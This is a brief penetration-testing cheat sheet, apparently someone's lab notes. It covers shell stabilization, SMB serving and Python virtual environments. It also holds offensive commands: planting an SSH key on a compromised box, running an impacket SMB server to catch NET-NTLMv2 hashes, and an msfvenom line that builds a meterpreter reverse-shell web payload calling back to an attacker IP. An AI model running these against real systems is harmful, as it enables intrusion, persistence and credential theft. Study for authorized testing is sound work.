### [](#header-3)To stabilize a bash shell:
```shell
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press enter twice
export TERM=xterm
```

### [](#header-3)Adding an SSH key to a box:
```shell
On Kali, generate a key:
    ssh-keygen -t rsa
Next, copy the public key over to the users /home/.ssh/authorized_keys file
Then, simply ssh in using the private key:
    ssh -i <key name> username@host
```

### [](#header-3)Cleaning an SSH key:
```shell
Sometimes you may need to copy and paste an SSH key, and it's supposed to work... but it's not. You may need to remove bad chars and clean it up:

chmod 600 id_rsa
dos2unix id_rsa
vi --clean id_rsa
inside vi: (esc) + wq
ssh -i id_rsa username@host
```

### [](#header-3)Serving an SMB server with impacket:
```shell
impacket-smbserver evil ./ -smb2support
```
It's good practice to use the smb2support flag. If you see a connection come through that doesn't provide a NET-NTLMv2 it could be because you set up
the smb server without smb2 support.

### [](#header-3)Setting up python virtual environments:
```shell
python3 -m venv myenv

source myenv/bin/activate

pip install -r requirements.txt (replace with whatever command is needed to install whatever it is your doing)
```

### [](#header-3)Call tools globally on linux regardless of user:
```shell
Move the tools to:
/usr/local/bin
```

### [](#header-3)Generic usage of msfvenom:
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.245 LPORT=4444 -f aspx -o shell.aspx
```
